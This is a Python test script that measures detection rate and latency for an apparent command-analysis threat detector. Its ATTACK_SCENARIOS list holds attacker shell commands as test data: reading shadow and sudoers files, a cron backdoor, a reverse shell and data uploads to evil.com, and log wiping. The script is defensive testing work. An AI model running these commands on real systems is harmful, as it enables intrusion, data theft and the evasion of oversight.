#!/usr/bin/env python3
"""
Real Attack Simulation Test
Simulates actual attacker behavior to test system under realistic conditions.
"""

import time
import sys
from datetime import datetime
from src.chronos.skills.command_analyzer import CommandAnalyzer
from src.chronos.skills.threat_library import ThreatLibrary
from src.chronos.skills.skill_detector import SkillDetector

# Real attack sequences collected from honeypot data
ATTACK_SCENARIOS = {
    "reconnaissance": [
        "whoami",
        "id",
        "uname -a",
        "cat /etc/os-release",
        "ps aux",
        "netstat -tulpn",
        "ifconfig",
        "cat /etc/passwd",
        "ls -la /home",
        "w",
    ],
    "privilege_escalation": [
        "sudo -l",
        "find / -perm -4000 2>/dev/null",
        "find / -writable -type f 2>/dev/null",
        "cat /etc/sudoers",
        "cat /etc/shadow",
    ],
    "persistence": [
        "crontab -l",
        "(crontab -l 2>/dev/null; echo '@reboot /tmp/backdoor.sh') | crontab -",
        "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
        "echo 'bash -i >& /dev/tcp/evil.com/443 0>&1' > /etc/profile.d/evil.sh",
    ],
    "exfiltration": [
        "tar czf /tmp/data.tar.gz /etc /var/www",
        "base64 /tmp/data.tar.gz > /tmp/encoded.txt",
        "curl -X POST -d @/tmp/data.tar.gz http://evil.com/upload",
        "scp /tmp/data.tar.gz attacker@evil.com:/loot/",
    ],
    "defense_evasion": [
        "history -c",
        "rm ~/.bash_history",
        "unset HISTFILE",
        "cat /dev/null > /var/log/auth.log",
        "sed -i '/attacker/d' /var/log/secure",
    ],
}


def test_scenario(name, commands, analyzer, library, detector):
    """Test a single attack scenario"""
    print(f"\n{'='*80}")
    print(f"SCENARIO: {name.upper()}")
    print(f"{'='*80}")
    
    session_id = f"test_{name}_{int(time.time())}"
    results = {
        "scenario": name,
        "commands": len(commands),
        "detected": 0,
        "techniques": set(),
        "signatures": 0,
        "total_risk": 0,
        "latencies": [],
    }
    
    analyses = []
    
    for i, cmd in enumerate(commands, 1):
        start = time.time()
        
        # Analyze command
        analysis_obj = analyzer.analyze(cmd)
        analyses.append(analysis_obj)
        analysis = {
            "risk_level": analysis_obj.risk_level,
            "risk_score": analysis_obj.risk_score,
            "techniques": analysis_obj.techniques
        }
        
        # Check threat library
        threats = library.match(cmd)
        
        latency = (time.time() - start) * 1000  # Convert to ms
        results["latencies"].append(latency)
        
        # Collect stats
        if analysis["risk_level"] != "benign":
            results["detected"] += 1
        
        results["total_risk"] += analysis["risk_score"]
        results["techniques"].update(analysis["techniques"])
        results["signatures"] += len(threats)
        
        # Print detailed result
        risk_symbol = "🚨" if analysis["risk_level"] in ["high", "critical"] else "⚠️" if analysis["risk_level"] == "medium" else "✓"
        print(f"  [{i:2d}] {risk_symbol} {cmd[:60]:<60} | Risk: {analysis['risk_level']:8s} | {latency:.2f}ms")
        
        if threats:
            for threat in threats:
                print(f"       └─ Matched: {threat.name}")
    
    # Get skill profile
    profile = detector.analyze_session(session_id, analyses)
    
    # Calculate averages
    avg_latency = sum(results["latencies"]) / len(results["latencies"])
    p95_latency = sorted(results["latencies"])[int(len(results["latencies"]) * 0.95)]
    
    print(f"\n{'─'*80}")
    print(f"RESULTS:")
    print(f"  Commands:          {results['commands']}")
    print(f"  Detected:          {results['detected']} ({results['detected']/results['commands']*100:.1f}%)")
    print(f"  Unique Techniques: {len(results['techniques'])}")
    print(f"  Threat Signatures: {results['signatures']}")
    print(f"  Total Risk:        {results['total_risk']}")
    print(f"  Avg Risk/Cmd:      {results['total_risk']/results['commands']:.1f}")
    print(f"  Skill Level:       {profile.get('skill_level', 'UNKNOWN').upper()}")
    print(f"  Avg Latency:       {avg_latency:.2f}ms")
    print(f"  P95 Latency:       {p95_latency:.2f}ms")
    
    return results


def main():
    print("\n" + "="*80)
    print("REAL ATTACK SIMULATION TEST")
    print("="*80)
    print(f"Started: {datetime.now().isoformat()}")
    print(f"Testing {len(ATTACK_SCENARIOS)} attack scenarios")
    print("="*80)
    
    # Initialize components
    analyzer = CommandAnalyzer()
    library = ThreatLibrary()
    detector = SkillDetector()
    
    all_results = []
    
    # Run each scenario
    for name, commands in ATTACK_SCENARIOS.items():
        result = test_scenario(name, commands, analyzer, library, detector)
        all_results.append(result)
    
    # Overall statistics
    print(f"\n{'='*80}")
    print("OVERALL STATISTICS")
    print(f"{'='*80}")
    
    total_commands = sum(r["commands"] for r in all_results)
    total_detected = sum(r["detected"] for r in all_results)
    all_latencies = []
    for r in all_results:
        all_latencies.extend(r["latencies"])
    
    print(f"  Total Commands:       {total_commands}")
    print(f"  Total Detected:       {total_detected} ({total_detected/total_commands*100:.1f}%)")
    print(f"  Avg Detection Latency: {sum(all_latencies)/len(all_latencies):.2f}ms")
    print(f"  P95 Detection Latency: {sorted(all_latencies)[int(len(all_latencies)*0.95)]:.2f}ms")
    print(f"  P99 Detection Latency: {sorted(all_latencies)[int(len(all_latencies)*0.99)]:.2f}ms")
    print(f"  Max Detection Latency: {max(all_latencies):.2f}ms")
    
    # Performance assessment
    avg_latency = sum(all_latencies) / len(all_latencies)
    detection_rate = total_detected / total_commands * 100
    
    print(f"\n{'='*80}")
    print("PERFORMANCE ASSESSMENT")
    print(f"{'='*80}")
    
    # Latency check
    if avg_latency < 10:
        print(f"  ✅ Latency: EXCELLENT (<10ms avg)")
    elif avg_latency < 50:
        print(f"  ✅ Latency: GOOD (<50ms avg)")
    elif avg_latency < 100:
        print(f"  ⚠️  Latency: ACCEPTABLE (<100ms avg)")
    else:
        print(f"  ❌ Latency: POOR (>100ms avg)")
    
    # Detection rate check
    if detection_rate > 80:
        print(f"  ✅ Detection Rate: EXCELLENT (>80%)")
    elif detection_rate > 60:
        print(f"  ✅ Detection Rate: GOOD (>60%)")
    elif detection_rate > 40:
        print(f"  ⚠️  Detection Rate: ACCEPTABLE (>40%)")
    else:
        print(f"  ❌ Detection Rate: POOR (<40%)")
    
    print(f"\n{'='*80}")
    print("VALIDATION STATUS")
    print(f"{'='*80}")
    
    if avg_latency < 50 and detection_rate > 60:
        print("  ✅ PASS: System meets Phase 1 performance criteria")
        return 0
    else:
        print("  ⚠️  REVIEW: System performance needs improvement")
        if avg_latency >= 50:
            print("     - Optimize detection algorithms")
        if detection_rate <= 60:
            print("     - Enhance pattern matching")
        return 1


if __name__ == "__main__":
    sys.exit(main())
